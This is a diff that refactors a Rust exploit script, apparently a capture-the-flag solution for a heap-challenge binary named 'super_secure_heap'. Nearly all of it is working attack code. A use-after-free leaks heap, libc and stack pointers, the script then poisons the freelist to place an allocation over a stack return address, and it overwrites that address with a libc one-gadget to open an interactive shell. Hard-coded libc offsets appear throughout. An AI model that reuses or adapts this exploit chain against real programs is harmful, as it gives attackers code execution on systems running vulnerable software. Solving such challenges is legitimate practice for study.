@@ -7,87 +7,82 @@ use prawn::tubes::process::*;
 use prawn::tubes::Tube;
 use prawn::util::*;
 
-mod macros;
-use crate::macros::*;
-
 use std::error::Error;
 
 type Result<T> = std::result::Result<T, Box<dyn Error>>;
 
-async fn selkey(key: bool) -> Result<()> {
+async fn selkey(p: &mut Process, key: bool) -> Result<()> {
    if !key {
-       sendlineafter!(b">", b"2")?;
+       p.sendlineafter(b">", b"2").await?;
    } else {
-       sendlineafter!(b">", b"1")?;
+       p.sendlineafter(b">", b"1").await?;
    }
    Ok(())
 }
 
-async fn alloc(size: usize, key: bool) -> Result<()> {
-    selkey(key).await?;
-    sendline!(b"1")?;
-    sendline!(&format!("{}", size).into_bytes())?;
+async fn alloc(p: &mut Process, size: usize, key: bool) -> Result<()> {
+    selkey(p, key).await?;
+    p.sendline(b"1").await?;
+    p.sendline(&format!("{}", size).into_bytes()).await?;
     Ok(())
 }
 
-async fn delete(idx: usize, key: bool) -> Result<()> {
-    selkey(key).await?;
-    sendline!(b"2")?;
-    sendline!(&format!("{}", idx).into_bytes())?;
+async fn delete(p: &mut Process, idx: usize, key: bool) -> Result<()> {
+    selkey(p, key).await?;
+    p.sendline(b"2").await?;
+    p.sendline(&format!("{}", idx).into_bytes()).await?;
     Ok(())
 }
 
-async fn modify(idx: usize, keyno: usize, size: usize, cont: Vec<u8>) -> Result<()> {
-    selkey(false).await?;
-    sendline!(b"3")?;
-    sendline!(&format!("{}", idx).into_bytes())?;
-    sendline!(&format!("{}", keyno).into_bytes())?;
-    sendline!(&format!("{}", size).into_bytes())?;
-    send!(&cont)?;
+async fn modify(p: &mut Process, idx: usize, keyno: usize, size: usize, cont: Vec<u8>) -> Result<()> {
+    selkey(p, false).await?;
+    p.sendline(b"3").await?;
+    p.sendline(&format!("{}", idx).into_bytes()).await?;
+    p.sendline(&format!("{}", keyno).into_bytes()).await?;
+    p.sendline(&format!("{}", size).into_bytes()).await?;
+    p.send(&cont).await?;
     Ok(())
 }
 
-async fn kmodify(idx: usize, size: usize, cont: Vec<u8>) -> Result<()> {
-    selkey(true).await?;
-    sendline!(b"3")?;
-    sendline!(&format!("{}", idx).into_bytes())?;
-    sendline!(&format!("{}", size).into_bytes())?;
-    sendline!(&cont)?;
+async fn kmodify(p: &mut Process, idx: usize, size: usize, cont: Vec<u8>) -> Result<()> {
+    selkey(p, true).await?;
+    p.sendline(b"3").await?;
+    p.sendline(&format!("{}", idx).into_bytes()).await?;
+    p.sendline(&format!("{}", size).into_bytes()).await?;
+    p.sendline(&cont).await?;
     Ok(())
 }
 
-async fn show(idx: usize, key: bool) -> Result<()> {
-    selkey(key).await?;
-    sendline!(b"4")?;
-    sendline!(&format!("{}", idx).into_bytes())?;
+async fn show(p: &mut Process, idx: usize, key: bool) -> Result<()> {
+    selkey(p, key).await?;
+    p.sendline(b"4").await?;
+    p.sendline(&format!("{}", idx).into_bytes()).await?;
     Ok(())
 }
 
 #[tokio::main]
 async fn main() -> Result<()> {
     let cfg = ProcessConfig::default();
-    *PROC.lock().await = Some(
-        Process::new(["./bins/super_secure_heap"], &cfg).await?
-    );
+    let mut p = Process::new(["./bins/super_secure_heap"], &cfg).await?;
 
     // setup key
     let key = b"LOL";
-    alloc(key.len()+1, true).await?;
-    kmodify(0, key.len(), key.to_vec()).await?;
+    alloc(&mut p, key.len()+1, true).await?;
+    kmodify(&mut p, 0, key.len(), key.to_vec()).await?;
 
     //// uaf to leak a freelist pointer
     let heap_leak = {
-        alloc(20, false).await?;
-        alloc(20, false).await?;
-        delete(0, false).await?;
-        delete(1, false).await?;
+        alloc(&mut p, 20, false).await?;
+        alloc(&mut p, 20, false).await?;
+        delete(&mut p, 0, false).await?;
+        delete(&mut p, 1, false).await?;
 
-        show(1, false).await?;
+        show(&mut p, 1, false).await?;
 
-        recvuntil!(b"Here is your content:")?;
-        recvline!()?;
+        p.recvuntil(b"Here is your content:").await?;
+        p.recvline().await?;
 
-        let mut heap_leak = recv!(6)?;
+        let mut heap_leak = p.recv(6).await?;
         heap_leak.append(&mut vec![0u8, 0]);
         u64_chk(&heap_leak)?
     };
@@ -96,17 +91,17 @@ async fn main() -> Result<()> {
     //// uaf to leak an arena pointer from unsorted bin consolidation
     let environ_off = 0x1ef600;
     let libc_leak = {
-        alloc(0xec0, false).await?;
-        alloc(0xec0, false).await?;
-        delete(2, false).await?;
-        delete(3, false).await?;
+        alloc(&mut p, 0xec0, false).await?;
+        alloc(&mut p, 0xec0, false).await?;
+        delete(&mut p, 2, false).await?;
+        delete(&mut p, 3, false).await?;
 
-        show(2, false).await?;
+        show(&mut p, 2, false).await?;
 
-        recvuntil!(b"Here is your content:")?;
-        recvline!()?;
+        p.recvuntil(b"Here is your content:").await?;
+        p.recvline().await?;
 
-        let mut libc_leak = recv!(6)?;
+        let mut libc_leak = p.recv(6).await?;
         libc_leak.append(&mut vec![0u8, 0]);
         u64_chk(&libc_leak)? - 0x1ecbe0
     };
@@ -117,51 +112,51 @@ async fn main() -> Result<()> {
 
     // hijack freelist to get an allocation on libc environ to leak stack
     let stack_leak = {
-        modify(1, 0, p64(environ).len(), p64(environ)).await?;
+        modify(&mut p, 1, 0, p64(environ).len(), p64(environ)).await?;
 
-        alloc(20, false).await?;
-        alloc(20, false).await?;
+        alloc(&mut p, 20, false).await?;
+        alloc(&mut p, 20, false).await?;
 
-        show(5, false).await?;
+        show(&mut p, 5, false).await?;
 
-        recvuntil!(b"Here is your content:")?;
-        recvline!()?;
+        p.recvuntil(b"Here is your content:").await?;
+        p.recvline().await?;
 
-        let mut stack_leak = recv!(6)?;
+        let mut stack_leak = p.recv(6).await?;
         stack_leak.append(&mut vec![0u8, 0]);
         u64_chk(&stack_leak)?
     };
     println!("stack: {:#x}", &stack_leak);
 
     // get idx 7 on the freelist
-    alloc(32, false).await?;
-    alloc(32, false).await?;
-    delete(6, false).await?;
-    delete(7, false).await?;
+    alloc(&mut p, 32, false).await?;
+    alloc(&mut p, 32, false).await?;
+    delete(&mut p, 6, false).await?;
+    delete(&mut p, 7, false).await?;
 
     // reallocate 7 as a key (keys contents won't be encrypted)
-    alloc(32, true).await?;
+    alloc(&mut p, 32, true).await?;
 
     // free idx 7 again to create a uaf on the previous key chunk
-    delete(7, false).await?;
+    delete(&mut p, 7, false).await?;
 
     // overwrite the freelist pointer to get an allocation on the stack
     let return_addr = stack_leak - 0x100;
     println!("ret leak: {:#x}", &return_addr);
-    kmodify(1, 8, p64(return_addr)).await?;
+    kmodify(&mut p, 1, 8, p64(return_addr)).await?;
 
     // moves hijacked chunk to top of freelist
-    alloc(32, false).await?;
+    alloc(&mut p, 32, false).await?;
 
     // this chunk should be on top of the return addr
-    alloc(32, true).await?;
+    alloc(&mut p, 32, true).await?;
 
     // overwrite return addr with one gadget
     let one_gadget = p64(libc_leak+0xe3b01);
-    kmodify(2, 31, one_gadget).await?;
+    kmodify(&mut p, 2, 31, one_gadget).await?;
 
     // exit and get shell!
-    p!().sendline(b"3").await?;
-    p!().interactive().await?;
+    p.sendline(b"3").await?;
+    p.interactive().await?;
     Ok(())
 }
